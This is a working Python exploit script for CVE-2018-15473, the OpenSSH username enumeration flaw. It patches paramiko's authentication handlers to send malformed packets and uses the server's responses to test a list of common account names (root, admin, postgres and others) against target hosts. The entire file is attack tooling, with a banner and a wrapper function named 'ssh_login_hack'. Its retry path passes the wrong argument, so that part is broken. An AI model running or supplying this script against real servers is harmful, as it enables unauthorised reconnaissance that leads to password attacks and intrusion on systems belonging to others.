# Exploit: OpenSSH 7.7 - Username Enumeration
# Affected Versions: OpenSSH version < 7.7
# CVE: CVE-2018-15473


import paramiko
import multiprocessing
import socket
import sys
import json
import warnings

#Color
G = '\033[92m'  # green
Y = '\033[93m'  # yellow
B = '\033[94m'  # blue
R = '\033[91m'  # red
W = '\033[0m'   # white



def banner():
    print("""%s
	╔═══╗╔═══╗╔╗─╔╗     ╔══╗─╔═══╗╔╗─╔╗╔════╗╔═══╗     ╔╗───╔═══╗╔═══╗╔══╗╔═╗─╔╗
	║╔═╗║║╔═╗║║║─║║     ║╔╗║─║╔═╗║║║─║║║╔╗╔╗║║╔══╝     ║║───║╔═╗║║╔═╗║╚╣─╝║║╚╗║║
	║╚══╗║╚══╗║╚═╝║     ║╚╝╚╗║╚═╝║║║─║║╚╝║║╚╝║╚══╗     ║║───║║─║║║║─╚╝─║║─║╔╗╚╝║
	╚══╗║╚══╗║║╔═╗║     ║╔═╗║║╔╗╔╝║║─║║──║║──║╔══╝     ║║─╔╗║║─║║║║╔═╗─║║─║║╚╗║║
	║╚═╝║║╚═╝║║║─║║     ║╚═╝║║║║╚╗║╚═╝║──║║──║╚══╗     ║╚═╝║║╚═╝║║╚╩═║╔╣─╗║║─║║║
	╚═══╝╚═══╝╚╝─╚╝     ╚═══╝╚╝╚═╝╚═══╝──╚╝──╚═══╝     ╚═══╝╚═══╝╚═══╝╚══╝╚╝─╚═╝
    """ % W)

# store function we will overwrite to malform the packet
old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

# create custom exception
class BadUsername(Exception):
    def __init__(self):
        pass

# create malicious "add_boolean" function to malform packet
def add_boolean(*args, **kwargs):
    pass

# create function to call when username was invalid
def call_error(*args, **kwargs):
    raise BadUsername()

# create the malicious function to overwrite MSG_SERVICE_ACCEPT handler
def malform_packet(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result  = old_parse_service_accept(*args, **kwargs)
    #return old add_boolean function so start_client will work again
    paramiko.message.Message.add_boolean = old_add_boolean
    return result

# create function to perform authentication with malformed packet and desired username
def checkUsername(username, hostname, tried=0):
    sock = socket.socket()
    sock.connect((hostname, 22))
    # instantiate transport
    transport = paramiko.transport.Transport(sock)
    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        # server was likely flooded, retry up to 3 times
        transport.close()
        if tried < 4:
            tried += 1
            return checkUsername(username, tried)
        else:
            print(f'{R}[-] Failed to negotiate SSH transport{W}')
    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
    except BadUsername:
        print(f'{Y}[-]{username} is not a username!{W}')
        return (username, False)
    except paramiko.ssh_exception.AuthenticationException:
        if username != '1234567891234':
            print(f'{G}[+]{username} is a username!{W}')
        return (username, True)
    except Exception:
        print(f"{R}There was an error. Is this the correct version of OpenSSH?{W}")
        return ('', False)
    return ('', False)

def test_connection(hostname):
    sock = socket.socket()
    try:
        sock.connect((hostname, 22))
        sock.close()
        return True
    except socket.error:
        print(f'{R}[-] Connecting to host failed. Please check the specified host and port.{W}')
        return False

def right_username(results):
    res = []
    if results == []:
        return []
    elif results[0][0] == "":
        return []
    else:
        for username in results:
            if username[1]:
                res.append(username[0])
    return res

def main(hostname):
    
    warnings.simplefilter("ignore")
    # assign functions to respective handlers
    paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
    paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
    
    threads=5
    userList = ['root', 'admin', 'mysql', 'oracle', 'nginx', 'apache', 'test', 'cisco', 'daemon', 'server', 'service', 'zabbix', 'user', 'nagios', 'guest', 'postgres', 'info', 'backup', 'web', 'tomcat', 'r00t', 'upload', 'linux', 'ftp', 'support', 'www', 'www-data']

    pool = multiprocessing.Pool(threads)
    results = []
    try:
        if test_connection(hostname):
            if not checkUsername('1234567891234', hostname)[1]:
                results = list(map(lambda username: checkUsername(username, hostname), userList))
    except Exception:
        print("Error")
    return right_username(results)

def ssh_login_hack(hosts):
    banner()
    ssh_login_hack_dict = {}
    for hostname in hosts:
        ssh_login_hack_dict[hostname] = main(hostname)
    return ssh_login_hack_dict

